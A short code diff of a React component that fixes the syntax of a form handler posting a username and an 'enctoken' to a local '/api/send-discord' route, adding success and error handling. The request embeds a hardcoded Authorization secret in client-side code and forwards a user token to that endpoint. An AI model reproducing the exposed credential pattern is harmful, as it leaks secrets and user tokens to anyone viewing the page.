@@ -34,20 +34,29 @@ export default function EnterUsername() {
     checkToken();
   }, [enctoken]);
 
-  const handleSubmit = async (e) => {
-    e.preventDefault();
-    if (!username) return;
+const handleSubmit = async (e) => {
+  e.preventDefault();
+  if (!username) return;
 
-    try {
-      const res = await fetch('/api/send-discord', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'Authorization': 'A7b_C9d-E3f_G1hJ'
-        },
-        body: JSON.stringify({ username, enctoken }),
-      });
-  }};
+  try {
+    const res = await fetch('/api/send-discord', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Authorization': 'A7b_C9d-E3f_G1hJ'
+      },
+      body: JSON.stringify({ username, enctoken }),
+    });
+
+    if (res.ok) {
+      setSubmitted(true);
+    } else {
+      setStatus('error');
+    }
+  } catch {
+    setStatus('error');
+  }
+};
 
 
   return (
